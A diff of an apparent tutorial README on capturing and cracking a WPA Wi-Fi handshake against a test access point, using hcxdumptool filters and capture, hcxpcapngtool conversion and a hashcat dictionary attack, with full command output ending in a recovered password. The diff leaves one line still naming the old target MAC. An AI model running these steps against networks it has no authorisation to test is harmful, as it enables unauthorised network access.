@@ -26,16 +26,16 @@ AP channel: **11**
 
 The creation of a [BPF](https://wiki.wireshark.org/CaptureFilters) is **mandatory** as it make hcxdumptool either _ignore_ the specified address, or _attack_ the specified address.
 
-The full command to create a BPF to _attack_ 00c0cab035be would be as follows:
+The full command to create a BPF to _attack_ ccce1edc3bee would be as follows:
 
 ```
-hcxdumptool --bpfc="wlan addr1 00c0cab035be or wlan addr2 00c0cab035be or wlan addr3 00c0cab035be" >> attack.bpf
+hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf
 ```
 
-The full command to create a BPF to _protect_ 00c0cab035be would be as follows:
+The full command to create a BPF to _protect_ ccce1edc3bee would be as follows:
 
 ```
-hcxdumptool --bpfc="not wlan addr3 00c0cab035be" >> protect.bpf
+hcxdumptool --bpfc="not wlan addr3 ccce1edc3bee" > protect.bpf
 ```
 
 Since we are going to attack 00c0cab035be, we will use the **attack.bpf** filter.
@@ -53,7 +53,15 @@ sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w TestAP.pcapng
 
 After running that command for a while, the output was as follows:
 
-![hcxdumptool output](/docs/example-pic-1.png?raw=true "hcxdumptool TestAP output")
+```
+CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID          (SCAN:  2462/11)
+---+--------+------+------------+------------+--------------------------------
+ 11|08:43:02|ep+++ |1246d6b3d1c3|ccce1edc3bee|AP_7272
+^C
+1361 Packet(s) captured by kernel
+0 Packet(s) dropped by kernel
+exit on sigterm
+```
 
 ### Step Three - Conversion
 
@@ -62,12 +70,67 @@ We now have a complete capture with all information needed for cracking the PSK.
 The command to do so is as follows:
 
 ```
-hcxpcapngtool -o TestAP.hc22000 TestAP.pcapng
+hcxpcapngtool -o testap.hc22000 testap.pcapng
 ```
 
 After running hcxpcapngtool, the output was as follows:
 
-![hcxpcapngtool output](/docs/example-pic-2.png?raw=true "hcxpcapngtool output")
+```
+hcxpcapngtool 7.0.1-41-g6412f87 reading from testap.pcapng...
+
+summary capture file
+--------------------
+file name................................: testap.pcapng
+version (pcapng).........................: 1.0
+operating system.........................: Linux 6.18.5-arch1-1
+application..............................: hcxdumptool 7.0.1-46-g96125ac
+interface name...........................: wlp48s0f4u2u4
+interface vendor.........................: 74da38
+openSSL version..........................: 1.0
+weak candidate...........................: 12345678
+MAC ACCESS POINT.........................: 000e221bc298 (incremented on every new client)
+MAC CLIENT...............................: 90b4dd7b81dd
+REPLAYCOUNT..............................: 65021
+ANONCE...................................: b78dc26402ab03f5941cbd90a85909d2bfcb8a433e630144a31bd00eb9ed3984
+SNONCE...................................: ed0baac00e561183ca05efac8e7552c0df03b00ceec0d815e0e02bf867c2c0f8
+timestamp minimum (timestamp)............: 22.01.2026 07:49:45 (1769068185)
+timestamp maximum (timestamp)............: 22.01.2026 07:50:08 (1769068208)
+duration of the dump tool (seconds)......: 22
+used capture interfaces..................: 1
+link layer header type...................: DLT_IEEE802_11_RADIO (127)
+endianness (capture system)..............: little endian
+packets inside...........................: 53
+packets received on 2.4 GHz..............: 53
+ESSID (total unique).....................: 2
+BEACON (total)...........................: 1
+BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
+PROBEREQUEST (undirected)................: 1
+PROBEREQUEST (directed)..................: 1
+PROBERESPONSE (total)....................: 1
+AUTHENTICATION (total)...................: 1
+AUTHENTICATION (OPEN SYSTEM).............: 1
+EAPOL messages (total)...................: 47
+EAPOL RSN messages.......................: 47
+EAPOLTIME gap (measured maximum msec)....: 41
+EAPOL ANONCE error corrections (NC)......: not detected
+EAPOL M1 messages (total)................: 44
+EAPOL M2 messages (total)................: 1
+EAPOL M3 messages (total)................: 1
+EAPOL M4 messages (total)................: 1
+EAPOL M4 messages (zeroed NONCE).........: 1
+EAPOL pairs (total)......................: 2
+EAPOL pairs (best).......................: 1
+EAPOL pairs written to 22000 hash file...: 1 (RC checked)
+EAPOL M32E2 (authorized - ANONCE from M3): 1
+
+frequency statistics from radiotap header (frequency: received packets)
+-----------------------------------------------------------------------
+ 2462: 53
+
+session summary
+---------------
+processed pcapng files................: 1
+```
 
 > [!NOTE]
 > hcxpcapngtool will throw errors if:
@@ -87,9 +150,71 @@ There are many different ways to use Hashcat but we will just use a straight dic
 The command will be as follows:
 
 ```
-sudo hashcat -a 0 -m 22000 ./TestAP.hc22000 ./Wordlists/probable.txt
+hashcat -m 22000 testap.hc22000 wordlist
 ```
 
 After letting Hashcat run for a while, the output was as follows:
 
-![Hashcat output](/docs/example-pic-3.png?raw=true "cracked Hashcat output")
+```
+hashcat (v7.1.2-382-g2d71af371) starting
+
+CUDA API (CUDA 13.1)
+====================
+* Device #01: NVIDIA GeForce RTX 4080, 15701/15945 MB, 76MCU
+
+OpenCL API (OpenCL 3.0 CUDA 13.1.112) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #02: NVIDIA GeForce RTX 4080, skipped
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 4406 MB (57159 MB free)
+
+Dictionary cache built:
+* Filename..: wordlist
+* Passwords.: 2856483
+* Bytes.....: 31389246
+* Keyspace..: 2856483
+* Speed.....: 605 MiB/s
+* Runtime...: 0.05s
+
+452977dd851b12891cdac3b767cdf42e:ccce1edc3bee:ced2f3e34efc:AP_7272:12345678
+7d47aae049369991cd38f22d27da218b:ccce1edc3bee:1246d6b3d1c3:AP_7272:12345678
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+Hash.Target......: testap.hc22000
+Time.Started.....: Thu Jan 22 08:52:26 2026 (0 secs)
+Time.Estimated...: Thu Jan 22 08:52:26 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 8-63 bytes)
+Guess.Base.......: File (wordlist)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1496.8 kH/s (8.84ms) @ Accel:4 Loops:512 Thr:384 Vec:1
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
+Progress.........: 116741/2856483 (4.09%)
+Rejected.........: 5/116741 (0.00%)
+Restore.Point....: 0/2856483 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:1-3
+Candidate.Engine.: Device Generator
+Candidates.#01...: $HEX[2020202020202020] -> 20217238
+Hardware.Mon.#01.: Temp: 31c Fan:  0% Util:  0% Core:2865MHz Mem:10801MHz Bus:16
+
+Started: Thu Jan 22 08:52:24 2026
+Stopped: Thu Jan 22 08:52:28 2026
+```
+
